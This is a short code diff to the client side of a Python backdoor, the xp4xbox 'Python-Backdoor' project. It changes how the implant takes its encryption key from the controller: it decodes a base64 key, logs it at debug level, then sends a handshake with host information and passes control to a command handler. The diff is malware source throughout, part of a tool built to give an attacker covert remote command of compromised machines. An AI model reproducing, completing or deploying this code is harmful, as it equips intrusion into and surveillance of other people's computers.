@@ -5,7 +5,7 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-
+import base64
 import socket
 import time
 
@@ -32,14 +32,13 @@ class Socket(EncryptedSocket):
             else:
                 break
 
-        while True:
-            command = self.recv_json(False)
-            if command["key"] == CLIENT_KEY:
-                self.set_key(command["value"].encode())
+        # first message must always be the key as b64
+        key = base64.b64decode(self.recv(False))
+        self.set_key(key)
+        self.logger.debug(f"recv key: {key}")
 
-                # send handshake
-                self.send_json(CLIENT_HANDSHAKE, control.get_info())
-                break
+        # send handshake
+        self.send_json(CLIENT_HANDSHAKE, control.get_info())
 
         ch = CommandHandler(self)
 
